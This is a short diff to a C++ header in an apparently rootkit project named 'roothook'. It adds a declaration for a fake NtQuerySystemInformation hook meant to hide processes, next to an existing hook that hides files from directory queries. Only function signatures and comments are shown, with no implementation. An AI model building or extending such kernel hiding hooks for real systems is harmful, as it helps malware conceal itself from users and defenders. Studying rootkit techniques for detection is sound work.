@@ -38,4 +38,8 @@ namespace roothook {
 		FILE_INFORMATION_CLASS FileInformationClass,
 		IN ULONG QueryFlags,
 		IN PUNICODE_STRING FileName OPTIONAL);  // Fake NtQueryDirectoryFileEx function to trace and hide wanted files
+	NTSTATUS EvilQuerySystemInformation(IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
+		OUT PVOID SystemInformation,
+		IN ULONG SystemInformationLength,
+		OUT PULONG ReturnLength OPTIONAL);  // Fake NtQuerySystemInformation to hide processes (mainly, can add others)
 }
